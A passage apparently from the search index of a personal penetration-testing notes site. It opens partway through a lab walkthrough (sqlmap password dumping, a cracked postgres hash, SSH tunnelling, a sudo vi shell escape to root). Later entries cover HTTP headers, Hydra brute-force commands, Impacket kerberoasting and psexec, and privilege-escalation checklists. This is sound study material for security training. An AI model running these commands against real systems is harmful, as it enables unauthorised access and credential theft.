http://10.129.95.174/dashboard.php --forms --cookie=\"PHPSESSID=kcr9helek579t5cjcldcbb5fc1\" --batch --passwords --dump\n\n# -----\n# database management system users password hashes:\n# [*] postgres [1]:\n#    password hash: md52d58e0637ec1e94cdfba3d1c26b67d01\n</code></pre> <p>First 3 characters are a tip about the hash. Using https://md5.gromweb.com/?md5=2d58e0637ec1e94cdfba3d1c26b67d01 we obtain: The MD5 hash: 2d58e0637ec1e94cdfba3d1c26b67d01 was succesfully reversed into the string: P@s5w0rd!postgres</p> <p>Now, as we couldn't spot port 5432 (postgres) open, we will use port-tunneling with ssh.</p> <pre><code>ssh UserNameInTheAttackedMachine@IPOfTheAttackedMachine -L 1234:localhost:5432 \n# We will listen for incoming connections on our local port 1234. When a client connects to our local port, the SSH client will forward the connection to the remote server on port 22. This allows the local client to access services on the remote server as if they were running on the local machine.\n# We are forwarding traffic from any given local port, for instance 1234, to the port on which PostgreSQL is listening, namely 5432, on the remote server. We therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.\n\nssh postgres@10.129.95.174 -L 1234:localhost:5432\n</code></pre> <p>After this, we can \"cat\" the user.txt file. </p> <p>To escalate provileges, first we can use some commands for basic reconnaissance:</p> <pre><code>whoami\nid\nsudo -l\n</code></pre> <p>Last one provides us with interesting output:</p> <pre><code>User postgres may run the following commands on vaccine:\n    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf\n</code></pre> <p>We can abuse suid binaries technique to gain access to root user:</p> <pre><code> sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\n:set shell=/bin/sh\n:shell\n</code></pre> <p>Once there, print out root flag:</p> <pre><code>cat /root/root.txt\n</code></pre>","tags":["walkthrough"]},{"location":"http-headers/","title":"HTTP headers","text":"Tools <ul> <li>Curl</li> </ul> <p>HTTP (Hypertext Transfer Protocol) is a stateless application layer protocol used for the transmission of resources like web application data and runs on top of TCP.</p> <p>It was specifically designed for communication between web browsers and web servers.</p> <p>HTTP utilizes the typical client-server architecture for communication, whereby the browser is the client, and the web server is the server. </p> <p>Resources are uniquely identified with a URL/URI.</p> <p>HTTP has 3 versions; HTTP 1.0, HTTP 1.1., and HTTP/2. And HTTP/3 in on its way.</p> <ul> <li>HTTP 1.1 is the most widely used version of HTTP and has several advantages over HTTP 1.0 such as the ability to re-use the same TCP connection, take advantage of the 3 ways handshake that was performed and request for multiple URI\u2019s/Resources in that connection.</li> </ul>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#structure-of-a-http-request","title":"Structure of a HTTP request","text":"<p>Request Line: The request line is the first line of an HTTP request and contains the following three components:</p> <pre><code>HTTP method (e.g., GET, POST, PUT, DELETE, etc.): Indicates the type of request being made.\nURL (Uniform Resource Locator): The address of the resource the client wants to access.\nHTTP version: The version of the HTTP protocol being used (e.g., HTTP/1.1).\n</code></pre> <p>Request Headers: they  provide additional information about the request. Common headers include:</p> <pre><code>User-Agent: Information about the client making the request (e.g., browser type).\nHost: The hostname of the server.\nAccept: The media types the client can handle in the response (e.g., HTML, JSON).\nAuthorization: Credentials for authentication, if required.\nCookie: Information stored on the client-side and sent back to the server with each request.\n</code></pre> <pre><code>GET /home/ HTTP/2\nHost: site.com\nCookie: session=cookie-value-00000-00000\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nDnt: 1\nSec-Gpc: 1\n</code></pre> <p>Request Body (Optional): Some HTTP methods (like POST or PUT) include a request body where data is sent to the server, typically in JSON or form data format.</p>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#http-verbs-or-methods","title":"HTTP verbs (or methods)","text":"","tags":["pentesting HTTP headers"]},{"location":"http-headers/#structure-of-a-http-response","title":"Structure of a HTTP response","text":"<p>Response headers: Similar to request headers, response headers provide additional information about the response. Common headers include:</p> <pre><code>Content-Type: The media type of the response content (e.g., text/html, application/json).\nContent-Length: The size of the response body in bytes.\nSet-Cookie: Used to set cookies on the client-side for subsequent requests.\nCache-Control: Directives for caching behavior.\n</code></pre> <p>Response Body (Optional):  The response body contains the actual content of the response. For example, in the case of an HTML page, the response body will contain the HTML markup.</p> <p>In response to the HTTP Request, the web server will respond with the requested resource, preceded by a bunch of new HTTP response headers. These new response headers from the web server will be used by your web browser to interpret the content contained in the Response content/body of the response.</p> <p>An example: </p> <pre><code>HTTP/1.1 200 OK\nDate: Fri, 13 Mar 2015 11:26:05 GMT\nCache-Control: private, max-age=0\nContent-Type: text/html; charset=UTF-8\nContent-Encoding: gzip\nServer: gws\nContent-Length: 258\n</code></pre>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#date-header","title":"Date header","text":"<p>The \"Date\" header in an HTTP response is used to indicate the date and time when the response was generated by the server. It helps clients and intermediaries to understand the freshness of the response and to synchronize the time between the server and the client. This is used in a blind SQLinjection, to see how long it takes for the server to respond.</p>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#status-code","title":"Status code","text":"<p>The status code can be resume in the following chart:</p> <p></p>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#content-type","title":"Content-Type","text":"<p>The \"Content-Type\" header in an HTTP response is used to indicate the media type of the response content. It tells the client what type of data the server is sending so that the client can handle it appropriately.</p> <p>List of all content-type headers</p>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#cache-control","title":"Cache-control","text":"<p>Cache-control: Cache-control is a header used to specify caching policies for browsers and other caching services.  Specifically, the\u00a0<code>Cache-Control</code>\u00a0HTTP header field holds\u00a0directives\u00a0(instructions) \u2014 in both requests and responses \u2014 that control caching in browsers and shared caches (e.g. Proxies, CDNs).</p> <p></p> <p>Why this configuration is considered safe?  Cache-control: no-store, no-cache, max-age=0.  - The max-age=N response directive indicates that the response remains fresh until N seconds after the response is generated.  - The no-cache response directive indicates that the response can be stored in caches, but the response must be validated with the origin server before each reuse, even when the cache is disconnected from the origin server. - The no-store response directive indicates that any caches of any kind (private or shared) should not store this response.</p>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#server-header","title":"Server header","text":"<p>The Server header displays the Web Server banner, for example, Apache, Nginx, IIS etc. Google uses a custom web server banner: gws (Google Web Server).</p>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#set-cookie","title":"Set-Cookie","text":"<p>From geeksforgeeks: \"The\u00a0HTTP header Set-Cookie\u00a0is a response header and used to send cookies from the server to the user agent. So the user agent can send them back to the server later so the server can detect the user.\"</p> <pre><code># The cookie name have to avoid this character ( ) @, ; : \\ \u201d / [ ] ? = { } plus control characters, spaces, and tabs. It can be any US-ASCII characters.\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;\n\n# This directive defines the host where the cookie will be sent. It is an optional directive.\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;\n\n# It is an optional directive that contains the expiry date of the cookie.\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;\n\n# Forbids JavaScript from accessing the cookie, for example, through the\u00a0`Document.cookie`\u00a0property. Note that a cookie that has been created with\u00a0`HttpOnly`\u00a0will still be sent with JavaScript-initiated requests, for example, when calling\u00a0`XMLHttpRequest.send()`\u00a0or\u00a0`fetch()`. This mitigates attacks against cross-site scripting XSS.\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly\n\n# It contains the life span in a digit of seconds format, zero or negative value will make the cookie expired immediately.\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;number&gt;\n\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Partitioned\n\n# This directive define a path that must exist in the requested URL, else the browser can\u2019t send the cookie header.\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;\n\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure\n\n# This directives providing some protection against cross-site request forgery attacks.\n# Strict means that the browser sends the cookie only for same-site requests, that is, requests originating from the same site that set the cookie. If a request originates from a different domain or scheme (even with the same domain), no cookies with the\u00a0`SameSite=Strict`\u00a0attribute are sent.\n\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=Strict\n\n# Lax means that the cookie is not sent on cross-site requests, such as on requests to load images or frames, but is sent when a user is navigating to the origin site from an external site (for example, when following a link). This is the default behavior if the\u00a0`SameSite`\u00a0attribute is not specified.\n\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=Lax\n\n# means that the browser sends the cookie with both cross-site and same-site requests. The\u00a0`Secure`\u00a0attribute must also be set when setting this value, like so\u00a0`SameSite=None; Secure`\n\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=None; Secure\n\n// Multiple attributes are also possible, for example:\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly\n</code></pre>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#understanding-samesite-attribute","title":"Understanding SameSite attribute","text":"<p>Differences between SameSite and SameOrigin: we will use the URL\u00a0<code>http://www.example.org</code>\u00a0 to  see the differences more clearly.</p> URL Description same-site same-origin <code>http://www.example.org</code> Identical URL \u2705 \u2705 <code>http://www.example.org:80</code> Identical URL (implicit port) \u2705 \u2705 <code>http://www.example.org:8080</code> Different port \u2705 \u274c <code>http://sub.example.org</code> Different subdomain \u2705 \u274c <code>https://www.example.org</code> Different scheme \u274c \u274c <code>http://www.example.evil</code> Different TLD \u274c \u274c <p>When thinking about\u00a0<code>SameSite</code>\u00a0cookies, we're only thinking about \"same-site\" or \"cross-site\".</p>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#cors-cross-origin-resource-sharing","title":"CORS - Cross-Origin Resource Sharing","text":"<p>Cross-Origin Resource Sharing\u00a0(CORS) is an\u00a0HTTP-header based mechanism that allows a server to indicate any\u00a0origins\u00a0(domain, scheme, or port) other than its own from which a browser should permit loading resources.</p> <p>For security reasons, browsers restrict cross-origin HTTP requests initiated from scripts.</p> <p></p>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#x-xss-protection","title":"X-XSS-Protection","text":"<p>The HTTP\u00a0<code>X-XSS-Protection</code>\u00a0response header is a feature of Internet Explorer, Chrome and Safari that stops pages from loading when they detect reflected cross-site scripting XSS  attacks.</p> <p>Syntax</p> <pre><code># Disables XSS filtering.\nX-XSS-Protection: 0\n\n# Enables XSS filtering (usually default in browsers). If a cross-site scripting attack is detected, the browser will sanitize the page (remove the unsafe parts).\nX-XSS-Protection: 1\n\n# Enables XSS filtering. Rather than sanitizing the page, the browser will prevent rendering of the page if an attack is detected.\nX-XSS-Protection: 1; mode=block\n\n# Enables XSS filtering. If a cross-site scripting attack is detected, the browser will sanitize the page and report the violation. This uses the functionality of the CSP report-uri\u00a0directive to send a report.\nX-XSS-Protection: 1; report=&lt;reporting-uri&gt;\n</code></pre>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#strict-transport-security","title":"Strict-Transport-Security","text":"<p>The HTTP Strict-Transport-Security response header (often abbreviated as HSTS) informs browsers that the site should only be accessed using HTTPS, and that any future attempts to access it using HTTP should automatically be converted to HTTPS.</p> <p>Directives</p> <pre><code># The time, in seconds, that the browser should remember that a site is only to be accessed using HTTPS.\nmax-age=&lt;expire-time&gt;\n\n# If this optional parameter is specified, this rule applies to all of the site's subdomains as well.\nincludeSubDomains \n</code></pre> <p>Example:</p> <pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains\n</code></pre> <p>Additionally, Google maintains an HSTS preload service (used also by Firefox and Safari). By following the guidelines and successfully submitting your domain, you can ensure that browsers will connect to your domain only via secure connections. While the service is hosted by Google, all browsers are using this preload list. However, it is not part of the HSTS specification and should not be treated as official. Directive for the preload service is:</p> <pre><code># When using preload, the max-age directive must be at least 31536000 (1 year), and the includeSubDomains directive must be present.\npreload\n</code></pre> <p>Sending the\u00a0<code>preload</code>\u00a0directive from your site can have\u00a0PERMANENT CONSEQUENCES\u00a0and prevent users from accessing your site and any of its subdomains if you find you need to switch back to HTTP.</p> <p>What OWASP says about HSTS response header.</p>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#exploitation","title":"Exploitation","text":"<p>Site owners can use HSTS to identify users without cookies. This can lead to a significant privacy leak. Take a look\u00a0here\u00a0for more details.</p> <p>Cookies can be manipulated from sub-domains, so omitting the\u00a0<code>includeSubDomains</code>\u00a0option permits a broad range of cookie-related attacks that HSTS would otherwise prevent by requiring a valid certificate for a subdomain. Ensuring the\u00a0<code>secure</code>\u00a0flag is set on all cookies will also prevent, some, but not all, of the same attacks.</p> <p>So... basically HSTS addresses the following threats:</p> <ul> <li>User bookmarks or manually types\u00a0<code>http://example.com</code>\u00a0and is subject to a man-in-the-middle attacker: HSTS automatically redirects HTTP requests to HTTPS for the target domain.</li> <li>Web application that is intended to be purely HTTPS inadvertently contains HTTP links or serves content over HTTP: HSTS automatically redirects HTTP requests to HTTPS for the target domain</li> <li>A man-in-the-middle attacker attempts to intercept traffic from a victim user using an invalid certificate and hopes the user will accept the bad certificate: HSTS does not allow a user to override the invalid certificate message</li> </ul>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#https","title":"HTTPS","text":"<p>HTTPS (Hypertext Transfer Protocol Secure) is a secure version of the HTTP protocol, which is used to transmit data between a user's web browser and a website or web application. </p> <p>HTTPS provides an added layer of security by encrypting the data transmitted over the internet, making it more secure and protecting it from unauthorized access and interception.</p> <p>HTTPS is also commonly referred to as HTTP Secure. HTTPS is the preferred way to use and configure HTTP and involves running HTTP over SSL/TLS. </p> <p>SSL (Secure Sockets Layer) and TLS (Transport Layer Security) are cryptographic protocols used to provide secure communication over a computer network, most commonly the internet. They are essential for establishing a secure and encrypted connection between a user's web browser or application and a web server.</p> <p>HTTPS does not protect against web application flaws! Various web application attacks will still work regardless of the use of SSL/TLS.(Attacks like XSS and SQLi will still work)</p> <p>The added encryption layer only protects data exchanged between the client and the server and does stop attacks against the web application itself.</p>","tags":["pentesting HTTP headers"]},{"location":"http-headers/#tools","title":"Tools","text":"","tags":["pentesting HTTP headers"]},{"location":"http-headers/#security-headers","title":"Security Headers","text":"<ul> <li>https://securityheaders.com/</li> </ul>","tags":["pentesting HTTP headers"]},{"location":"httprint/","title":"httprint - A web server fingerprinting tool","text":"<p>httprint is a web server fingerprinting tool. It relies on web server characteristics to accurately identify web servers, despite the fact that they may have been obfuscated by changing the server banner strings, or by plug-ins such as mod_security or servermask. </p> <p>httprint can also be used to detect web enabled devices which do not have a server banner string, such as wireless access points, routers, switches, cable modems, etc. </p> <pre><code>httprint -P0 -h &lt;target hosts&gt; -s &lt;signature file&gt;\n# -P0 for avoiding pinging the host\n# -h target host\n# -s set the signature file to use\n</code></pre>","tags":["pentesting","enumeration","server enumeration","web server","fingerprinting"]},{"location":"httrack/","title":"HTTrack - A tool for mirrowing sites","text":"<p>HTTrack is a free (GPL, libre/free software) offline browser utility that allows you to download a World Wide Web site from the Internet to a local directory, building recursively all directories, getting HTML, images, and other files from the server to your computer. </p> <p>HTTrack arranges the original site's relative link-structure. Simply open a page of the \"mirrored\" website in your browser, and you can browse the site from link to link, as if you were viewing it online. HTTrack can also update an existing mirrored site, and resume interrupted downloads. HTTrack is fully configurable, and has an integrated help system.</p>","tags":["reconnaissance","scanning","passiverecon"]},{"location":"httrack/#installation","title":"Installation","text":"<p>Link to the project: https://www.httrack.com/.</p> <pre><code>sudo apt-get install httrack\n</code></pre>","tags":["reconnaissance","scanning","passiverecon"]},{"location":"httrack/#basic-usage","title":"Basic usage","text":"<p>Create a folder for replicating in it your target.</p> <pre><code>mkdir targetsite\nhttrack domain.com  targetsite/\n</code></pre> <p>Interactive mode:</p> <pre><code>httrack\n</code></pre>","tags":["reconnaissance","scanning","passiverecon"]},{"location":"hugo/","title":"Hugo","text":""},{"location":"hugo/#install-hugo","title":"Install Hugo","text":"<pre><code>sudo apt-get install hugo\n</code></pre>"},{"location":"hugo/#hugo-basic-commands","title":"Hugo basic commands","text":"<p>Go to your project folder and creates a new site </p> <pre><code>hugo new site &lt;name-project&gt;\n</code></pre> <p>Initialize the repo</p> <pre><code>git init\n</code></pre> <p>Launch the server Hugo so you can open it in your http://localhost:1313</p> <pre><code>hugo server\n</code></pre> <p>Create new content, like for instance:</p> <ul> <li>A new chapter:</li> </ul> <pre><code>hugo new --kind chapter hugo/_index.md\n</code></pre> <ul> <li>A new entry:</li> </ul> <pre><code>hugo new hugo/quick_start.md\n</code></pre>"},{"location":"hydra/","title":"Hydra","text":"<p>Hydra can attack nearly 50 services including: Cisco auth, FTP, HTTP, IMAP, RDP, SMB, SSH, Telnet... It uses modules for each protocol</p>","tags":["pentesting","brute forcing","windows","passwords"]},{"location":"hydra/#basic-commands","title":"Basic commands","text":"<pre><code># Main syntax:\nhydra -L users.txt -P pass.txt &lt;service://server&gt; &lt;options&gt;\n\n# Get information about a module\nhydra -U rdp \n\n\n# Attack a telnet service\nhydra -L users.txt -P pass.txt telnet://target.server  \n\n# Attack a ssh service\nhydra -L user.list -P password.list ssh://$ip\n\n# Attack 3389 RDP\nhydra -L user.list -P password.list rdp://$ip\n\n# Attack samba\nhydra -L user.list -P password.list smb://$ip\n\n# Attack a web resource\nhydra -L users-txt -P pass.txt http-get://localhost/   \n# -l: specify login name\n# -L: specify a list with login names\n# -p: specify a single passwords\n# -P: specify a file with passwords\n# -C: specify a file with user:password\n# -t: how many parallel connections to run when cracking\n# -V: verbose\n# -f: it stops the attack after finding a password\n# -M: list of servers to attack, one entry per line, \u2018:\u2019 to specify port\n\n# To see sintax of the http-get and http-post-form modules:\nhydra -U http-post-form   \n# This will return:\n#    &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]\n#    Example: \u201c/login.php:userin=^USER^&amp;passin=^PASS^:incorrect\u201d\n#    it perform the attack in the login.php page. It uses the input label name userin (or any other, we need to retrieve this from the html code of the form) to insert the dictionary for users. It uses the input label name passin  (or any other, we need to retrieve this from the html code of the form) to insert the dictionary for passwords. It uses the word incorrect to check out the result of the login process (we need to observe the web behaviour to pick a word). For example:\nhydra -l pentester -P /usr/share/wordlists/metasploit/password.lst zev0nlxhh78mfshrhzvq9h8vm.eu-central-4.attackdefensecloudlabs.com http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=%2Fwp-admin%2F&amp;testcookie=1:S=Success\"\n\n\n# Example for ftp in a non default port\nhydra -L users.txt -P pass.txt ftp://$ip:2121\n\n# Attacking a pop3 service\nhydra -L users.txt -p 'Company01!' -f $ip pop3\n</code></pre>","tags":["pentesting","brute forcing","windows","passwords"]},{"location":"hydra/#real-life-examples","title":"Real-life examples","text":"<pre><code>hydra crack.me http-post-form \u201c/login.php:usr=^USER^&amp;pwd=^PASS^:invalid credential\u201d -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt -f\n\nhydra 192.168.1.45 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -V\n\nhydra -l student -P /usr/share/wordlists/rockyou.txt  ssh://192.153.213.3\n</code></pre>","tags":["pentesting","brute forcing","windows","passwords"]},{"location":"i3/","title":"i3 - A windows management tool","text":"<p>Some tips from an experienced user: https://www.reddit.com/r/i3wm/comments/zjq8yf/some_tips_on_how_to_take_advantage_of_i3wm/ https://github.com/cknadler/vim-anywhere https://i3wm.org/docs/userguide.html</p>"},{"location":"i3/#config-file","title":"Config file","text":"<p>Located at ~/.config/i3/config</p> <p>You can add your own configurations. </p>"},{"location":"i3/#quick-guide","title":"Quick guide","text":"<pre><code># Open a terminal windows. By default it will open horizontally\n$mod+Enter\n\n# Open vertically next window\n$mod+v\n\n# Open horizontally next window\n$mod+h.\n\n# Select your parent container. If you have a selection of containers, then you can do an action on them, like to close them \n$mod+a\n\n# Move the position of the tiled windows \n$mod+Shift+Arrows // and move the windows around\n\n# Close a window\n$mod+Shift+Q\n\n# Enter full-screen mode\n$mod+f\n\n# Switch workspace\n$mod+num // To switch to workspace 2: $mod+2.\n\n# Moving windows to workspaces\n$mod+Shift+num // where num is the target workspace\n\n# Restarting i3\n$mod+Shift+r\n\n# Exiting i3\n$mod+Shift+e\n</code></pre>"},{"location":"i3/#customization","title":"Customization","text":""},{"location":"i3/#locking-screen","title":"Locking screen","text":"<p>In my case I've added a shortcut to lock the screen:</p> <pre><code># keybinding to lock screen\nbindsym $mod+Control+l exec \"i3lock -c 000000\"\n</code></pre> <p>This requires having installed the tools i3lock (allegedly already installed) and xautolock (not preinstalled)</p> <pre><code>sudo apt install i3lock xautolock\n</code></pre>"},{"location":"i3/#scratchpad","title":"Scratchpad","text":"<p>Also, I've added scratchpad shortcuts</p> <pre><code># Make the currently focused window a scratchpad\nbindsym $mod+Shift+space move scratchpad\n\n# Show the first scratchpad window\nbindsym $mod+space scratchpad show\n</code></pre>"},{"location":"impacket-GetUserSPNs/","title":"GetUserSPNs.py","text":"","tags":["pentesting","kerberos","kerberoasting"]},{"location":"impacket-GetUserSPNs/#installation","title":"Installation","text":"<p>Install Impacket from: https://github.com/fortra/impacket</p> <pre><code>git clone https://github.com/fortra/impacket\ncd impacket\nsudo python3 -m pip install .\n</code></pre>","tags":["pentesting","kerberos","kerberoasting"]},{"location":"impacket-GetUserSPNs/#basic-commands","title":"Basic commands","text":"<pre><code># Gather a listing of SPNs in the domain.\nGetUserSPNs.py -dc-ip $ip $domain/$username\n# Example:\n# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend\n\n\n# Requesting all TGS Tickets\nGetUserSPNs.py -dc-ip $ip $domain/$username -request \n# Example:\n# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request \n\n# Request a single TGS ticket:\nGetUserSPNs.py -dc-ip $ip $domain/$username -request-user $userrequested -outputfile file_tgs\n# -outputfile:  to write the TGS tickets to a file \n# Example:\n# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev\n</code></pre>","tags":["pentesting","kerberos","kerberoasting"]},{"location":"impacket-ntlmrelayx/","title":"ntlmrelayx - a module from Impacket","text":"","tags":["pentesting","smb"]},{"location":"impacket-ntlmrelayx/#installation","title":"Installation","text":"<p>Download from: https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py</p>","tags":["pentesting","smb"]},{"location":"impacket-psexec/","title":"Impacket PsExec","text":"<p>The PSExec service then creates a\u00a0named pipe\u00a0that can send commands to the system. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the\u00a0<code>ADMIN$</code>\u00a0share on the target host. It then registers the service via\u00a0<code>RPC</code>\u00a0and the\u00a0<code>Windows Service Control Manager</code>. Once established, communication happens over a named pipe, providing an interactive remote shell as\u00a0<code>SYSTEM</code>\u00a0on the victim host.</p>","tags":["pentesting","smb"]},{"location":"impacket-psexec/#installation","title":"Installation","text":"<p>Donwload from: Impacket PsExec\u00a0-</p>","tags":["pentesting","smb"]},{"location":"impacket-psexec/#basic-commands","title":"Basic commands","text":"<pre><code># Get help \nimpacket-psexec -h\n\n# Connect to a remote machine with a local administrator account\nimpacket-psexec administrator:'&lt;password&gt;'@$ip\n\n# Connect to a remote machine with a local administrator account\npsexec.py $domain/$user:$password@$ip \n</code></pre>","tags":["pentesting","smb"]},{"location":"impacket-smbexec/","title":"Impacket SMBExec","text":"<p>Impacket SMBExec\u00a0- A similar approach to PsExec without using\u00a0RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.</p>","tags":["pentesting","windows"]},{"location":"impacket-smbexec/#installation","title":"Installation","text":"<p>Donwload from: Impacket PsExec\u00a0-</p>","tags":["pentesting","windows"]},{"location":"impacket-smbexec/#basic-commands","title":"Basic commands","text":"<pre><code># Get help \nimpacket-smbexec -h\n\n# Connect to a remote machine with a local administrator account\nimpacket-smbexec administrator:'&lt;password&gt;'@$ip\n</code></pre>","tags":["pentesting","windows"]},{"location":"impacket/","title":"Impacket - A python tool for network protocols","text":"","tags":["pentesting","windows"]},{"location":"impacket/#what-for","title":"What for?","text":"<p>Impacket is a collection of Python classes for working with network protocols. For instance:</p> <ul> <li>Ethernet, Linux \"Cooked\" capture.</li> <li>IP, TCP, UDP, ICMP, IGMP, ARP.</li> <li>IPv4 and IPv6 Support.</li> <li>NMB and SMB1, SMB2 and SMB3 (high-level implementations).</li> <li>MSRPC version 5, over different transports: TCP, SMB/TCP, SMB/NetBIOS and HTTP.</li> <li>Plain, NTLM and Kerberos authentications, using password/hashes/tickets/keys.</li> <li>Portions/full implementation of the following MSRPC interfaces: EPM, DTYPES, LSAD, LSAT, NRPC, RRP, SAMR, SRVS, WKST, SCMR, BKRP, DHCPM, EVEN6, MGMT, SASEC, TSCH, DCOM, WMI, OXABREF, NSPI, OXNSPI.</li> <li>Portions of TDS (MSSQL) and LDAP protocol implementations.</li> </ul>","tags":["pentesting","windows"]},{"location":"impacket/#installation","title":"Installation","text":"<pre><code>git clone https://github.com/SecureAuthCorp/impacket.git\ncd impacket\npip3 install .\n\n# OR:\nsudo python3 setup.py install\n\n# In case you are missing some modules:\npip3 install -r requirements.txt\n\n# In case you don't have pip3 (pip for Python3) installed, or Python3, install it with the following commands\nsudo apt install python3 python3-pip\n</code></pre>","tags":["pentesting","windows"]},{"location":"impacket/#basic-tools-included","title":"Basic tools included","text":"<ul> <li>samrdump </li> <li>smbserver</li> <li>PsExec</li> <li> </li> </ul>","tags":["pentesting","windows"]},{"location":"impacket/#getuserspns","title":"GetUserSPNs","text":"","tags":["pentesting","windows"]},{"location":"index-linux-privilege-escalation/","title":"Index for Linux Privilege Escalation","text":"<p>+++</p>","tags":["privilege escalation"]},{"location":"index-linux-privilege-escalation/#index-for-linux-privilege-escalation","title":"Index for Linux Privilege Escalation","text":"Guides to have at hand <ul> <li>HackTricks.  Written by the creator of WinPEAS and LinPEAS.</li> <li>Vulnhub PrivEsc Cheatsheet.</li> <li>s0cm0nkey's Security Reference Guide.</li> </ul> <p>This is a nice summary related to Local Privilege Escalation by @s4gi_:</p> <p></p>","tags":["privilege escalation"]},{"location":"index-linux-privilege-escalation/#basic-commands-for-reconnaissance","title":"Basic commands for reconnaissance","text":"<p>Some basic commands once you have gained access to a Linux machine:</p> <pre><code>whoami\npwd\nid\nuname -a\nlsb_release -a\n</code></pre>","tags":["privilege escalation"]},{"location":"index-linux-privilege-escalation/#enumeration-scripts","title":"Enumeration scripts","text":"<p>Enumeration scripts</p> <ul> <li>Scan the Linux system with \"linEnum\".</li> <li>Search for possible paths to escalate privileges with \"linPEAS\".</li> <li>Enumerate privileges with \"Linux Privilege Checker\" tool.</li> <li>Enumerate possible exploits with \"Linux Exploit Suggester\" tool.</li> </ul>","tags":["privilege escalation"]},{"location":"index-linux-privilege-escalation/#privilege-escalation-techniques","title":"Privilege escalation techniques","text":"<p>Techniques</p> <ul> <li>Cron jobs: path, wildcards, file overwrite.</li> <li>Daemons. </li> <li>Dirty cow.</li> <li>File Permissions: <ul> <li>Configuration files.</li> <li>Startup scripts.</li> <li>Process capabilities: getcap</li> <li>Suid binaries: shared object injection, symlink, environmental variables.</li> <li>Lxd privileges escalation.</li> </ul> </li> <li>Kernel vulnerability exploitation.</li> <li>LD_PRELOAD / LD_LIBRARY_PATH.</li> <li>NFS.</li> <li>Password Mining: logs, memory, history, configuration files.</li> <li>Sudo: shell escape sequences, abuse intended functionality.</li> <li>ssh keys.</li> </ul>","tags":["privilege escalation"]},{"location":"index-windows-privilege-escalation/","title":"Index for Windows Privilege Escalation","text":"Guides to have at hand <ul> <li>HackTricks.  Written by the creator of WinPEAS and LinPEAS.</li> <li>Vulnhub PrivEsc Cheatsheet.</li> <li>s0cm0nkey's Security Reference Guide.</li> </ul> <p>This is a nice summary related to Local Privilege Escalation by @s4gi_:</p> <p></p>","tags":["privilege escalation","windows"]},{"location":"index-windows-privilege-escalation/#enumeration-scripts","title":"Enumeration scripts","text":"<p>Enumeration scripts</p> <ul> <li>Windows Privilege Escalation Awesome Scripts: winPEAS tool.</li> <li>Seatbelt.</li> <li>JAWS.</li> </ul>","tags":["privilege escalation","windows"]},{"location":"index-windows-privilege-escalation/#privilege-escalation-techniques","title":"Privilege escalation techniques","text":"<p>Techniques</p> <ul> <li>Services:<ul> <li>DLL Hacking.</li> <li>Uniqued Path.</li> <li>Named Pipes.</li> <li>Registry.</li> <li>Windows binaries: LOLBAS.</li> <li>bin Path.</li> <li>Abusing a service with PowerUp.ps1</li> <li>Creating a service with PsExec.</li> </ul> </li> <li>Kernel.</li> <li>Password Mining:<ul> <li>Cached SAM.</li> <li>Cached LSASS.</li> <li>Pass The Hash.</li> <li>Configuration files: unattend.xml, SiteList.xml, web.config, vnc.ini.</li> <li>Logs.</li> <li>Credentials in recently accessed files/executed commands</li> <li>Memory: mimiktenz, Process Dump (minidump).</li> <li>.rdp Files.</li> <li>Registry: HKCU\\Software\\USERNAME\\PuTTY\\Sessions, AutoLogon, VNC.</li> </ul> </li> <li>Registry: <ul> <li>Autorun.</li> <li>AlwaysInstallElevated</li> </ul> </li> <li>Scheduled Tasks: <ul> <li>Binary Overwrite.</li> <li>Missing binary.</li> </ul> </li> <li>Hot Potato.</li> <li>Startup Applications</li> 